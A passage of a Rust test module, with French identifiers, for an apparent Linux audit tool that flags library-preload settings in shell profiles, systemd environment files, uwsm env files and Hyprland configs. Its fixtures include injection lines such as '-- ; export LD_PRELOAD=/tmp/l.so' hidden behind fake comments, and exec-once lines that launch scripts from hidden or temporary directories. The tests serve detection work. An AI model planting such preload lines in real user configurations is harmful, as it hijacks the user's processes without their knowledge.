            "-- ; export LD_PRELOAD=/tmp/l.so\n",
            "// ; export LD_PRELOAD=/tmp/l.so\n",
            "\x0b# ; export LD_PRELOAD=/tmp/l.so\n",
            "\u{a0}# ; export LD_AUDIT=/tmp/l.so\n",
            "unset A; export LD_PRELOAD=/tmp/l.so\n",
            "unset A && export LD_PRELOAD=/tmp/l.so\n",
            "-- ; export LD_PRE\\\nLOAD=/tmp/l.so\n",
        ];
        let mut faux = Vec::new();
        for (i, f) in fichiers.iter().enumerate() {
            for (j, l) in lignes.iter().enumerate() {
                let m = Maison::nouvelle(&format!("faux-commentaire-{i}-{j}"));
                m.ecrire(f, l);
                let c = m.lancements();
                let juste = c.probleme >= Some(Niveau::Eleve)
                    && c.message.contains(&format!("~/{f}:1 précharge"))
                    && crate::apprentissage::declarable(&c).is_err();
                if !juste {
                    faux.push(format!("{f} {l:?} : {:?} {}", c.probleme, c.message));
                }
            }
        }
        assert!(faux.is_empty(), "faux commentaires du shell : {faux:#?}");
        // Témoins : un vrai commentaire et un « unset » seul ne précharge rien.
        for (i, l) in [
            "# x ; export LD_PRELOAD=/tmp/l.so\n",
            " \t# export LD_PRELOAD=/tmp/l.so\n",
            "unset LD_PRELOAD\n",
            "unset -v LD_PRELOAD LD_AUDIT\n",
        ]
        .iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("vrai-commentaire-{i}"));
            m.ecrire(".profile", l);
            let c = m.lancements();
            assert!(!c.message.contains(":1 précharge"), "{l:?} : {}", c.message);
        }
        // La sauvegarde : un faux commentaire d'uwsm qui pose LD_PRELOAD la lève.
        let faux = sauvegarde_pas_levee(
            "faux-commentaire-uwsm",
            ".config/uwsm/env",
            "\x0b# x ; export LD_PRELOAD=/x.so\n",
            None,
        );
        assert!(faux.is_empty(), "{faux:#?}");
    }

    /// R-4 (re-contrôle 0.95, angle lecture) : environment.d, user.conf et ses compléments, et les fichiers d'uwsm se
    /// jugent aussi là où leurs lecteurs les cherchent hors de ~/.config : sous le XDG_CONFIG_HOME de la session, sous
    /// un XDG_CONFIG_HOME posé au gestionnaire de systemd du compte, et pour uwsm sous un XDG_DATA_DIRS posé de même
    /// (uwsm 0.27, prepare-env.sh). Un préchargement posé là se lève à sa ligne.
    #[test]
    fn fichiers_de_variables_hors_de_config_juges() {
        let session = [("XDG_CONFIG_HOME", "/home/alice/.c")];
        let mut faux = Vec::new();
        for (i, (fichier, texte, attendu)) in [
            (
                ".c/environment.d/50-x.conf",
                "LD_PRELOAD=/tmp/l.so\n",
                "~/.c/environment.d/50-x.conf:1 précharge",
            ),
            (
                ".c/systemd/user.conf",
                "[Manager]\nDefaultEnvironment=LD_PRELOAD=/tmp/l.so\n",
                "~/.c/systemd/user.conf:2 précharge",
            ),
            (
                ".c/systemd/user.conf.d/x.conf",
                "[Manager]\nManagerEnvironment=LD_AUDIT=/tmp/l.so\n",
                "~/.c/systemd/user.conf.d/x.conf:2 précharge",
            ),
            (
                ".c/uwsm/env",
                "export LD_PRELOAD=/tmp/l.so\n",
                "~/.c/uwsm/env:1 précharge",
            ),
            (
                ".c/uwsm/env.d/a",
                "export LD_PRELOAD=/tmp/l.so\n",
                "~/.c/uwsm/env.d/a:1 précharge",
            ),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("hors-config-{i}"));
            m.ecrire(fichier, texte);
            let c = m.lancements_avec(&session);
            if !(c.probleme >= Some(Niveau::Eleve) && c.message.contains(attendu)) {
                faux.push(format!("{fichier} : {:?} {}", c.probleme, c.message));
            }
        }
        for (i, (pose, fichier, attendu)) in [
            (
                "XDG_CONFIG_HOME=/home/alice/.y\n",
                ".y/uwsm/env.d/a",
                "~/.y/uwsm/env.d/a:1 précharge",
            ),
            (
                "XDG_CONFIG_HOME=/home/alice/.y\n",
                ".y/environment.d/60-z.conf",
                "~/.y/environment.d/60-z.conf:1 précharge",
            ),
            (
                "XDG_DATA_DIRS=/home/alice/.d:/usr/share\n",
                ".d/uwsm/env",
                "~/.d/uwsm/env:1 précharge",
            ),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("hors-config-pose-{i}"));
            m.ecrire(".config/environment.d/10-x.conf", pose);
            // Sans « export » : valable dans les deux formats (uwsm lit ses fichiers sous « set -a »).
            m.ecrire(fichier, "LD_PRELOAD=/tmp/l.so\n");
            let c = m.lancements();
            if !(c.probleme >= Some(Niveau::Eleve) && c.message.contains(attendu)) {
                faux.push(format!("{fichier} posé par {pose:?} : {:?} {}", c.probleme, c.message));
            }
        }
        assert!(faux.is_empty(), "hors de ~/.config : {faux:#?}");
        // Témoin : un fichier d'uwsm sans préchargement sous le dossier de la session ne lève rien.
        let m = Maison::nouvelle("hors-config-temoin");
        m.ecrire(".c/uwsm/env", "export EDITOR=nvim\n");
        let c = m.lancements_avec(&session);
        assert!(!c.message.contains(":1 précharge"), "{}", c.message);
    }

    /// S-3 (re-contrôle 2 0.95, angle lecture) : uwsm lit « uwsm/env… » sous chaque XDG_CONFIG_DIRS et XDG_DATA_DIRS
    /// (uwsm 0.27, prepare-env.sh, `get_all_config_dirs_extended`). Un tel dossier que le compte peut changer hors de
    /// son dossier personnel (ici /var/tmp/x, à lui), de la session ou posé par environment.d, se juge comme ceux du
    /// dossier personnel : la pose en clair se lève à sa ligne. De même un fichier du gestionnaire rangé dans un
    /// dossier du système que root n'est pas seul à pouvoir changer (/run/environment.d). Témoins : hors de « uwsm »,
    /// rien ; sous /usr/share, que la racine d'essai tient pour à root seul (`programme_de_root_seul`), rien non plus.
    #[test]
    fn fichiers_de_variables_que_le_compte_change_hors_de_la_maison_juges() {
        // Sans « export » : valable dans les deux formats (uwsm lit ses fichiers sous « set -a »).
        const POSE: &str = "LD_PRELOAD=/opt/inerte/a.so\n";
        // Les dossiers nommés par la session.
        const DONNEES: &[(&str, &str)] = &[("XDG_DATA_DIRS", "/var/tmp/x:/usr/share")];
        const CONFIG: &[(&str, &str)] = &[("XDG_CONFIG_DIRS", "/var/tmp/x:/etc/xdg")];
        const CONFIG_SEUL: &[(&str, &str)] = &[("XDG_CONFIG_DIRS", "/var/tmp/x")];
        // Les mêmes, posés par une ligne de ~/.config/environment.d.
        const POSE_DONNEES: Option<&str> = Some("XDG_DATA_DIRS=/var/tmp/x:/usr/share\n");
        const POSE_CONFIG: Option<&str> = Some("XDG_CONFIG_DIRS=/var/tmp/x\n");
        // (variables de la session, ligne de ~/.config/environment.d, fichier sous la racine, levé)
        type Cas = (
            &'static [(&'static str, &'static str)],
            Option<&'static str>,
            &'static str,
            bool,
        );
        let cas: &[Cas] = &[
            (DONNEES, None, "var/tmp/x/uwsm/env", true),
            (DONNEES, None, "var/tmp/x/uwsm/env.d/a", true),
            (CONFIG, None, "var/tmp/x/uwsm/env", true),
            (CONFIG_SEUL, None, "var/tmp/x/uwsm/env-hyprland.d/b", true),
            (&[], POSE_DONNEES, "var/tmp/x/uwsm/env", true),
            (&[], POSE_DONNEES, "var/tmp/x/uwsm/env.d/a", true),
            (&[], POSE_CONFIG, "var/tmp/x/uwsm/env.d/a", true),
            (&[], None, "run/environment.d/50-x.conf", true),
            (DONNEES, None, "var/tmp/x/autre/env", false),
            (&[], None, "usr/share/uwsm/env.d/10-x", false),
        ];
        let mut faux = Vec::new();
        for (i, (session, pose, fichier, leve)) in cas.iter().enumerate() {
            let m = Maison::nouvelle(&format!("xdg-du-compte-{i}"));
            if let Some(p) = pose {
                m.ecrire(".config/environment.d/10-x.conf", p);
            }
            let f = m.racine.join(fichier);
            std::fs::create_dir_all(f.parent().unwrap()).unwrap();
            std::fs::write(&f, POSE).unwrap();
            let c = m.lancements_avec(session);
            let dit = c.probleme >= Some(Niveau::Eleve) && c.message.contains(&format!("{fichier}:1 précharge"));
            if dit != *leve {
                faux.push(format!(
                    "{fichier} ({session:?}, {pose:?}) : {:?} {}",
                    c.probleme, c.message
                ));
            }
        }
        assert!(faux.is_empty(), "que le compte change : {faux:#?}");
    }

    /// V-2 (relecture du lot c2-uwsm, 0.95) : « à root seul » se juge sur chaque entrée que la lecture traverse, pas
    /// sur le seul chemin réel. Dans un dossier d'uwsm que le compte change (/var/tmp/x, à lui), « env » en lien vers
    /// un fichier de root, ou « env.d » en lien vers un dossier de root : le compte choisit quel fichier de root uwsm
    /// lit comme un script ; il se juge, la pose en clair se lève à sa ligne. De même un lien de root dont la cible
    /// passe par un lien du compte (le lien du milieu, W-7). Témoins : le même fichier lu par un chemin de root (en
    /// lien de root ou non) reste muet ; le même lien sous ~/.config/uwsm se lève, comme avant.
    #[test]
    fn lien_du_compte_vers_un_fichier_de_root_juge() {
        // (liens posés sous la racine : (lien, cible), XDG_DATA_DIRS de la session, ce qui se montre, levé)
        type Cas = (
            &'static [(&'static str, &'static str)],
            &'static str,
            &'static str,
            bool,
        );
        const ROOT: &str = "usr/share/inerte/uwsm/env";
        let cas: &[Cas] = &[
            (
                &[("var/tmp/x/uwsm/env", ROOT)],
                "/var/tmp/x:/usr/share",
                "/var/tmp/x/uwsm/env:1",
                true,
            ),
            (
                &[("var/tmp/x/uwsm/env.d", "usr/share/inerte/uwsm")],
                "/var/tmp/x:/usr/share",
                "/var/tmp/x/uwsm/env.d/env:1",
                true,
            ),
            (
                &[("usr/share/uwsm/env", "var/tmp/l"), ("var/tmp/l", ROOT)],
                "/usr/share",
                "/usr/share/uwsm/env:1",
                true,
            ),
            (
                &[("home/alice/.config/uwsm/env", ROOT)],
                "/usr/share",
                "~/.config/uwsm/env:1",
                true,
            ),
            (
                &[("usr/share/uwsm/env", ROOT)],
                "/usr/share",
                "/usr/share/uwsm/env:1",
                false,
            ),
            (
                &[],
                "/usr/share/inerte:/usr/share",
                "/usr/share/inerte/uwsm/env:1",
                false,
            ),
        ];
        let mut faux = Vec::new();
        for (i, (liens, donnees, montre, leve)) in cas.iter().enumerate() {
            let m = Maison::nouvelle(&format!("lien-vers-root-{i}"));
            let f = m.racine.join(ROOT);
            std::fs::create_dir_all(f.parent().unwrap()).unwrap();
            std::fs::write(&f, "LD_PRELOAD=/opt/inerte/a.so\n").unwrap();
            for (lien, cible) in *liens {
                let l = m.racine.join(lien);
                std::fs::create_dir_all(l.parent().unwrap()).unwrap();
                std::os::unix::fs::symlink(m.racine.join(cible), &l).unwrap();
            }
            let c = m.lancements_avec(&[("XDG_DATA_DIRS", donnees)]);
            let dit = c.probleme >= Some(Niveau::Eleve) && c.message.contains(&format!("{montre} précharge"));
            if dit != *leve {
                faux.push(format!("{liens:?} ({donnees}) : {:?} {}", c.probleme, c.message));
            }
        }
        assert!(faux.is_empty(), "liens vers root : {faux:#?}");
    }

    /// S-3 : un dossier d'uwsm d'un XDG_DATA_DIRS hors du dossier personnel qui ne se lit pas est dit (non vérifié),
    /// jamais tu, et l'alerte ne se déclare pas normale.
    #[cfg(unix)]
    #[test]
    fn dossier_d_uwsm_illisible_hors_de_la_maison_dit() {
        use std::os::unix::fs::PermissionsExt as _;
        let m = Maison::nouvelle("xdg-illisible");
        let d = m.racine.join("var/tmp/x/uwsm");
        std::fs::create_dir_all(d.join("env.d")).unwrap();
        std::fs::write(d.join("env.d/a"), "export EDITOR=nvim\n").unwrap();
        std::fs::set_permissions(&d, std::fs::Permissions::from_mode(0o000)).unwrap();
        if std::fs::read_dir(&d).is_ok() {
            std::fs::set_permissions(&d, std::fs::Permissions::from_mode(0o755)).unwrap();
            return crate::essais::saute("le compte lit un dossier sans droit de lecture (root, ou espace de noms)");
        }
        let c = m.lancements_avec(&[("XDG_DATA_DIRS", "/var/tmp/x:/usr/share")]);
        std::fs::set_permissions(&d, std::fs::Permissions::from_mode(0o755)).unwrap();
        assert!(c.probleme >= Some(Niveau::Eleve), "{:?} {}", c.probleme, c.message);
        assert!(c.message.contains("var/tmp/x/uwsm ne se lit pas"), "{}", c.message);
        assert!(crate::apprentissage::declarable(&c).is_err());
    }

    /// V-4 (relecture du lot c2-uwsm, 0.95) : un dossier d'uwsm qui n'en est pas un (une entrée de XDG_DATA_DIRS qui
    /// est un fichier, « uwsm » qui est un fichier, un lien cassé ou un lien vers un fichier) : uwsm n'y lit rien
    /// (« [ -f …/uwsm/env ] » échoue), Vanguard non plus. Absent, pas « ne se lit pas » : rien n'est levé.
    #[test]
    fn dossier_d_uwsm_qui_n_en_est_pas_un_absent() {
        // (fichier posé, lien posé (lien, cible), XDG_DATA_DIRS de la session)
        type Cas = (Option<&'static str>, Option<(&'static str, &'static str)>, &'static str);
        let cas: &[Cas] = &[
            (Some("var/tmp/f"), None, "/var/tmp/f:/usr/share"),
            (Some("var/tmp/x/uwsm"), None, "/var/tmp/x:/usr/share"),
            (
                None,
                Some(("var/tmp/x/uwsm", "var/tmp/absent")),
                "/var/tmp/x:/usr/share",
            ),
            (
                Some("var/tmp/f"),
                Some(("var/tmp/x/uwsm", "var/tmp/f")),
                "/var/tmp/x:/usr/share",
            ),
            // Témoin : une boucle de liens dans le dossier n'en fait pas un dossier illisible (comme avant).
            (
                Some("var/tmp/x/uwsm/a"),
                Some(("var/tmp/x/uwsm/env.d", "var/tmp/x/uwsm/env.d")),
                "/var/tmp/x:/usr/share",
            ),
        ];
        let mut faux = Vec::new();
        for (i, (fichier, lien, donnees)) in cas.iter().enumerate() {
            let m = Maison::nouvelle(&format!("uwsm-pas-un-dossier-{i}"));
            std::fs::create_dir_all(m.racine.join("var/tmp/x")).unwrap();
            if let Some(f) = fichier {
                let f = m.racine.join(f);
                std::fs::create_dir_all(f.parent().unwrap()).unwrap();
                std::fs::write(f, "EDITOR=nvim\n").unwrap();
            }
            if let Some((l, cible)) = lien {
                std::os::unix::fs::symlink(m.racine.join(cible), m.racine.join(l)).unwrap();
            }
            let c = m.lancements_avec(&[("XDG_DATA_DIRS", donnees)]);
            if c.probleme.is_some() || c.message.contains("ne se lit pas") {
                faux.push(format!("{fichier:?} {lien:?} : {:?} {}", c.probleme, c.message));
            }
        }
        assert!(faux.is_empty(), "pas un dossier : {faux:#?}");
    }

    /// V-5 (relecture du lot c2-uwsm, 0.95) : une entrée d'un dossier d'uwsm dont la nature ne se lit pas (« env.d » en
    /// lien vers un dossier dont le parent est fermé) est dite (non vérifié), jamais prise pour un fichier puis tue.
    /// Sous ~/.config/uwsm comme sous un XDG_DATA_DIRS hors du dossier personnel.
    #[cfg(unix)]
    #[test]
    fn entree_d_uwsm_dont_la_nature_ne_se_lit_pas_dite() {
        use std::os::unix::fs::PermissionsExt as _;
        let mut faux = Vec::new();
        for (i, lien) in ["var/tmp/x/uwsm/env.d", "home/alice/.config/uwsm/env.d"]
            .iter()
            .enumerate()
        {
            let m = Maison::nouvelle(&format!("uwsm-nature-illisible-{i}"));
            let ferme = m.racine.join("var/tmp/ferme");
            std::fs::create_dir_all(ferme.join("d")).unwrap();
            std::fs::write(ferme.join("d/a"), "LD_PRELOAD=/opt/inerte/a.so\n").unwrap();
            let l = m.racine.join(lien);
            std::fs::create_dir_all(l.parent().unwrap()).unwrap();
            std::os::unix::fs::symlink(ferme.join("d"), &l).unwrap();
            std::fs::set_permissions(&ferme, std::fs::Permissions::from_mode(0o000)).unwrap();
            if std::fs::metadata(&l).is_ok() {
                std::fs::set_permissions(&ferme, std::fs::Permissions::from_mode(0o755)).unwrap();
                return crate::essais::saute("le compte traverse un dossier sans droits (root, ou espace de noms)");
            }
            let c = m.lancements_avec(&[("XDG_DATA_DIRS", "/var/tmp/x:/usr/share")]);
            std::fs::set_permissions(&ferme, std::fs::Permissions::from_mode(0o755)).unwrap();
            let montre = lien.replace("home/alice/", "~/");
            let dit = c.probleme >= Some(Niveau::Eleve) && c.message.contains(&format!("{montre} ne se lit pas"));
            if !dit || crate::apprentissage::declarable(&c).is_ok() {
                faux.push(format!("{lien} : {:?} {}", c.probleme, c.message));
            }
        }
        assert!(faux.is_empty(), "nature illisible : {faux:#?}");
    }

    /// R-6 (re-contrôle 0.95, angle lecture) : un fichier qu'un fichier de variables lit par « . » ou « source » (un
    /// fichier d'uwsm, un profil) se juge aussi : un préchargement posé dans le fichier inclus se lève à sa ligne.
    #[test]
    fn fichier_inclus_par_un_fichier_de_variables_juge() {
        let mut faux = Vec::new();
        for (i, (fichier, inclusion)) in [
            (".config/uwsm/env.d/a", ". /home/alice/.x/v.sh\n"),
            (".config/uwsm/env", "source \"$HOME/.x/v.sh\"\n"),
            (".profile", "[ -f ~/.x/v.sh ] && . ~/.x/v.sh\n"),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("inclus-{i}"));
            m.ecrire(fichier, inclusion);
            m.ecrire(".x/v.sh", "EDITOR=nvim\nexport LD_PRELOAD=/tmp/l.so\n");
            let c = m.lancements();
            if !(c.probleme >= Some(Niveau::Eleve) && c.message.contains("~/.x/v.sh:2 précharge")) {
                faux.push(format!("{fichier} : {:?} {}", c.probleme, c.message));
            }
        }
        assert!(faux.is_empty(), "inclus : {faux:#?}");
        // Témoin : un fichier inclus sans préchargement ne lève rien.
        let m = Maison::nouvelle("inclus-temoin");
        m.ecrire(".config/uwsm/env", ". ~/.x/v.sh\n");
        m.ecrire(".x/v.sh", "export EDITOR=nvim\n");
        let c = m.lancements();
        assert!(!c.message.contains("v.sh:1 précharge"), "{}", c.message);
    }

    /// L-2 (campagne 0.95, angle lecture) : uwsm lit chaque fichier de « env.d » et « env-<bureau>.d », quelle que
    /// soit son extension (uwsm 0.27, prepare-env.sh, `source_dir`) : un préchargement posé dans « env.d/a » se juge
    /// comme dans « env.d/a.conf ».
    #[test]
    fn uwsm_env_d_sans_extension_juge() {
        for (i, (fichier, texte, attendu)) in [
            (
                ".config/uwsm/env.d/a",
                "export LD_PRELOAD=/tmp/l.so\n",
                Some("~/.config/uwsm/env.d/a:1 précharge"),
            ),
            (
                ".config/uwsm/env-hyprland.d/50-b",
                "export TERMINAL=kitty\nexport LD_PRELOAD=/tmp/l.so\n",
                Some("~/.config/uwsm/env-hyprland.d/50-b:2 précharge"),
            ),
            // Un « .conf » s'y lisait déjà : lu une fois, pas deux.
            (
                ".config/uwsm/env.d/a.conf",
                "export LD_PRELOAD=/tmp/l.so\n",
                Some("~/.config/uwsm/env.d/a.conf:1 précharge"),
            ),
            (".config/uwsm/env.d/a", "export EDITOR=nvim\n", None),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("uwsm-env-d-{i}"));
            m.ecrire(fichier, texte);
            let c = m.lancements();
            match attendu {
                Some(attendu) => {
                    assert!(c.probleme >= Some(Niveau::Eleve), "{fichier} : {}", c.message);
                    assert_eq!(c.message.matches(attendu).count(), 1, "{fichier} : {}", c.message);
                    assert!(crate::apprentissage::declarable(&c).is_err(), "{fichier}");
                }
                None => assert_eq!(c.probleme, None, "{fichier} : {}", c.message),
            }
        }
    }

    /// S-4 (re-contrôle 2 0.95, angle lecture) : uwsm suit un « env.d » ou « env-<bureau>.d » qui est un lien vers un
    /// dossier (« [ -d ] », prepare-env.sh, `source_dir`), sous ~/.config/uwsm comme sous tout autre dossier où il
    /// cherche (XDG_CONFIG_HOME de la session ou posé par environment.d, XDG_DATA_DIRS). Vanguard le suit partout, par
    /// la même liste (`fichiers_d_uwsm`) : la pose en clair du dossier visé se lève à sa ligne, une fois. Témoin : un
    /// lien vers le même dossier sous un autre nom, qu'uwsm ne lit pas, reste muet.
    #[test]
    fn uwsm_env_d_en_lien_suivi_partout() {
        const POSE: &str = "LD_PRELOAD=/opt/inerte/a.so\n";
        const C: &[(&str, &str)] = &[("XDG_CONFIG_HOME", "/home/alice/.c")];
        const D: &[(&str, &str)] = &[("XDG_DATA_DIRS", "/home/alice/.d:/usr/share")];
        const POSE_Y: Option<&str> = Some("XDG_CONFIG_HOME=/home/alice/.y\n");
        // (dossier d'uwsm sous la maison, nom du lien, variables de la session, ligne de ~/.config/environment.d, levé)
        type Cas = (
            &'static str,
            &'static str,
            &'static [(&'static str, &'static str)],
            Option<&'static str>,
            bool,
        );
        let cas: &[Cas] = &[
            (".config/uwsm", "env.d", &[], None, true),
            (".c/uwsm", "env.d", C, None, true),
            (".c/uwsm", "env-hyprland.d", C, None, true),
            (".y/uwsm", "env.d", &[], POSE_Y, true),
            (".d/uwsm", "env.d", D, None, true),
            (".c/uwsm", "autre", C, None, false),
        ];
        let mut faux = Vec::new();
        for (i, (uwsm, lien, session, pose, leve)) in cas.iter().enumerate() {
            let m = Maison::nouvelle(&format!("uwsm-lien-{i}"));
            if let Some(p) = pose {
                m.ecrire(".config/environment.d/10-x.conf", p);
            }
            m.ecrire(".cible/a", POSE);
            std::fs::create_dir_all(m.chemin(uwsm)).unwrap();
            std::os::unix::fs::symlink(m.chemin(".cible"), m.chemin(&format!("{uwsm}/{lien}"))).unwrap();
            let c = m.lancements_avec(session);
            let attendu = format!("~/{uwsm}/{lien}/a:1 précharge");
            let dit = if *leve {
                c.probleme >= Some(Niveau::Eleve) && c.message.matches(&attendu).count() == 1
            } else {
                !c.message.contains("/a:1 précharge")
            };
            if !dit {
                faux.push(format!(
                    "{uwsm}/{lien} ({session:?}, {pose:?}) : {:?} {}",
                    c.probleme, c.message
                ));
            }
        }
        assert!(faux.is_empty(), "env.d en lien : {faux:#?}");
    }

    /// S-4 : la liste unique d'uwsm (`fichiers_d_uwsm`) prend, sous ~/.config/uwsm aussi, chaque fichier du dossier,
    /// quel que soit son nom, comme la sauvegarde le faisait déjà : « ~/.config/uwsm/default », qu'un fichier d'uwsm
    /// du système d'Omarchy inclut, se juge ; sain, il reste muet.
    #[test]
    fn fichier_d_uwsm_de_tout_nom_juge() {
        for (i, (texte, attendu)) in [
            (
                "export LD_PRELOAD=/opt/inerte/a.so\n",
                Some("~/.config/uwsm/default:1 précharge"),
            ),
            ("export EDITOR=nvim\n", None),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("uwsm-tout-nom-{i}"));
            m.ecrire(".config/uwsm/default", texte);
            let c = m.lancements();
            match attendu {
                Some(attendu) => {
                    assert!(c.probleme >= Some(Niveau::Eleve), "{}", c.message);
                    assert_eq!(c.message.matches(attendu).count(), 1, "{}", c.message);
                }
                None => assert_eq!(c.probleme, None, "{}", c.message),
            }
        }
    }

    /// S-4 : la sauvegarde lit la même liste. Un « env.d » en lien sous un dossier de XDG_DATA_DIRS posé par
    /// environment.d se juge par ce qu'il contient, ses deux formes : sain, il ne lève plus la sauvegarde (il la levait
    /// comme un fichier qui ne se lit pas) ; avec un préchargement, il la lève (élevé, ExecStart nommé, non déclarable).
    #[test]
    fn uwsm_env_d_en_lien_juge_par_la_sauvegarde() {
        let mut faux = Vec::new();
        for vide in [false, true] {
            for (texte, leve) in [
                ("export EDITOR=nvim\n", false),
                ("export LD_PRELOAD=/opt/inerte/a.so\n", true),
            ] {
                let (m, service) = sauvegarde_d_essai(&format!("uwsm-lien-sauvegarde-{vide}-{leve}"), vide);
                m.ecrire(
                    ".config/environment.d/50-x.conf",
                    "XDG_DATA_DIRS=/home/alice/.d:/usr/share\n",
                );
                m.ecrire(".cible/a", texte);
                std::fs::create_dir_all(m.chemin(".d/uwsm")).unwrap();
                std::os::unix::fs::symlink(m.chemin(".cible"), m.chemin(".d/uwsm/env.d")).unwrap();
                let c = m.lancements();
                let nommee = service
                    .lines()
                    .position(|l| l.starts_with("ExecStart="))
                    .map(|n| format!("~/.config/systemd/user/{}:{} : ", crate::sauvegarde::SERVICE, n + 1))
                    .is_some_and(|e| c.message.contains(&e));
                let juste = if leve {
                    c.probleme == Some(Niveau::Eleve) && nommee && crate::apprentissage::declarable(&c).is_err()
                } else {
                    // La forme de la 0.94 garde son « À savoir » (information), qui n'est pas une levée.
                    c.probleme < Some(Niveau::Eleve)
                };
                if !juste {
                    faux.push(format!("env -i {vide}, {texte:?} : {:?} {}", c.probleme, c.message));
                }
            }
        }
        assert!(faux.is_empty(), "sauvegarde, env.d en lien : {faux:#?}");
    }

    /// V-3 (relecture du lot c2-uwsm, 0.95) : la sauvegarde lit les mêmes dossiers d'uwsm que le bilan
    /// (`dossiers_d_uwsm`) : un « uwsm/env » sous un XDG_DATA_DIRS ou XDG_CONFIG_DIRS de la session (hors du dossier
    /// personnel ou dedans) qui pose une variable que lit le chargeur la lève, ses deux formes (élevé, ExecStart
    /// nommé, non déclarable). Témoin : le même fichier sans telle variable ne la lève pas.
    #[test]
    fn uwsm_des_dossiers_de_la_session_juge_par_la_sauvegarde() {
        // (variable de la session, sa valeur, fichier sous la racine d'essai, texte, levé)
        type Cas = (&'static str, &'static str, &'static str, &'static str, bool);
        let cas: &[Cas] = &[
            (
                "XDG_DATA_DIRS",
                "/var/tmp/x:/usr/share",
                "var/tmp/x/uwsm/env",
                "LD_LIBRARY_PATH=/opt/inerte\n",
                true,
            ),
            (
                "XDG_CONFIG_DIRS",
                "/var/tmp/x",
                "var/tmp/x/uwsm/env",
                "GLIBC_TUNABLES=glibc.inerte=1\n",
                true,
            ),
            (
                "XDG_DATA_DIRS",
                "/home/alice/.d:/usr/share",
                "home/alice/.d/uwsm/env.d/a",
                "export LD_LIBRARY_PATH=/opt/inerte\n",
                true,
            ),
            (
                "XDG_DATA_DIRS",
                "/var/tmp/x:/usr/share",
                "var/tmp/x/uwsm/env",
                "EDITOR=nvim\n",
                false,
            ),
        ];
        let mut faux = Vec::new();
        for vide in [false, true] {
            for (i, (variable, valeur, fichier, texte, leve)) in cas.iter().enumerate() {
                let (m, service) = sauvegarde_d_essai(&format!("uwsm-session-sauvegarde-{vide}-{i}"), vide);
                let f = m.racine.join(fichier);
                std::fs::create_dir_all(f.parent().unwrap()).unwrap();
                std::fs::write(&f, texte).unwrap();
                let c = m.lancements_avec(&[(variable, valeur)]);
                let nommee = service
                    .lines()
                    .position(|l| l.starts_with("ExecStart="))
                    .map(|n| format!("~/.config/systemd/user/{}:{} : ", crate::sauvegarde::SERVICE, n + 1))
                    .is_some_and(|e| c.message.contains(&e));
                let juste = if *leve {
                    c.probleme == Some(Niveau::Eleve) && nommee && crate::apprentissage::declarable(&c).is_err()
                } else {
                    c.probleme < Some(Niveau::Eleve)
                };
                if !juste {
                    faux.push(format!("env -i {vide}, {fichier} : {:?} {}", c.probleme, c.message));
                }
            }
        }
        assert!(faux.is_empty(), "sauvegarde, dossiers d'uwsm de la session : {faux:#?}");
    }

    /// V-1 (relecture du lot c2-uwsm, 0.95) : uwsm lit aussi un morceau relatif de XDG_CONFIG_HOME, XDG_CONFIG_DIRS ou
    /// XDG_DATA_DIRS (prepare-env.sh, « ${1}/uwsm/env »), depuis son dossier courant : le dossier personnel pour le
    /// service du compte. De la session ou posé par ~/.config/environment.d, « rel/uwsm/env » se juge comme
    /// ~/rel/uwsm/env : la pose en clair se lève à sa ligne ; la sauvegarde aussi, ses deux formes. Témoin : hors de
    /// « uwsm », rien.
    #[test]
    fn dossier_relatif_d_uwsm_juge_depuis_la_maison() {
        // (variables de la session, ligne de ~/.config/environment.d, fichier sous la maison, levé)
        type Cas = (
            &'static [(&'static str, &'static str)],
            Option<&'static str>,
            &'static str,
            bool,
        );
        let cas: &[Cas] = &[
            (&[("XDG_DATA_DIRS", "rel:/usr/share")], None, "rel/uwsm/env", true),
            (&[("XDG_CONFIG_DIRS", "./rel")], None, "rel/uwsm/env.d/a", true),
            (&[("XDG_CONFIG_HOME", "rel")], None, "rel/uwsm/env", true),
            (&[], Some("XDG_DATA_DIRS=rel:/usr/share\n"), "rel/uwsm/env", true),
            (&[], Some("XDG_CONFIG_DIRS=rel\n"), "rel/uwsm/env-hyprland.d/b", true),
            (&[], Some("XDG_CONFIG_HOME=rel\n"), "rel/uwsm/env", true),
            (&[("XDG_DATA_DIRS", "rel:/usr/share")], None, "rel/autre/env", false),
        ];
        let mut faux = Vec::new();
        for (i, (session, pose, fichier, leve)) in cas.iter().enumerate() {
            let m = Maison::nouvelle(&format!("uwsm-relatif-{i}"));
            if let Some(p) = pose {
                m.ecrire(".config/environment.d/10-x.conf", p);
            }
            m.ecrire(fichier, "LD_PRELOAD=/opt/inerte/a.so\n");
            let c = m.lancements_avec(session);
            let dit = c.probleme >= Some(Niveau::Eleve) && c.message.contains(&format!("~/{fichier}:1 précharge"));
            if dit != *leve {
                faux.push(format!(
                    "{fichier} ({session:?}, {pose:?}) : {:?} {}",
                    c.probleme, c.message
                ));
            }
        }
        for vide in [false, true] {
            let (m, _) = sauvegarde_d_essai(&format!("uwsm-relatif-sauvegarde-{vide}"), vide);
            m.ecrire("rel/uwsm/env", "LD_LIBRARY_PATH=/opt/inerte\n");
            let c = m.lancements_avec(&[("XDG_DATA_DIRS", "rel:/usr/share")]);
            if !(c.probleme == Some(Niveau::Eleve)
                && c.message.contains(crate::sauvegarde::SERVICE)
                && crate::apprentissage::declarable(&c).is_err())
            {
                faux.push(format!("sauvegarde, env -i {vide} : {:?} {}", c.probleme, c.message));
            }
        }
        assert!(faux.is_empty(), "dossiers relatifs : {faux:#?}");
    }

    /// Quatrième vérification : une variable de Hyprland se remplace avant de juger la ligne ; une variable sans
    /// valeur connue est levée. Rien de tout cela ne se déclare (une variable rend la ligne ambiguë).
    #[test]
    fn variable_de_hypr_jugee() {
        for (i, (texte, attendu)) in [
            ("$p = ~/.x/agent.sh\nexec-once = /usr/bin/bash $p\n", "dossier caché"),
            ("exec-once = /usr/bin/bash $inconnue\n", "sans valeur connue"),
            ("$HOME = /tmp/.y\nexec-once = $HOME/agent\n", "dossier temporaire"),
            (
                "$a = /tmp\n$b = $a/.z\nexec-once = $b/agent # rien\n",
                "dossier temporaire",
            ),
            ("exec-once = /usr/bin/bash $(cat /etc/x)\n", "sans valeur connue"),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("variable-hypr-{i}"));
